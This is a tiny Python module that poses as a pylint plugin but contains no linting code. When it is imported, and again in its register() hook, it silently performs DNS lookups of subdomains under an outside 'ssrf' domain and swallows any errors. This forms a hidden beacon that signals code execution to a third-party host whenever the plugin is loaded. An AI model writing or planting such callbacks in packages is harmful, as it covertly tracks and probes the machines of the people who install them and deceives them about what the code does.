import socket
try:
    socket.gethostbyname("pylint-plugin.py1.ssrf.xixixo123.site")
except Exception:
    pass

def register(linter):
    try:
        socket.gethostbyname("pylint-register.py1.ssrf.xixixo123.site")
    except Exception:
        pass
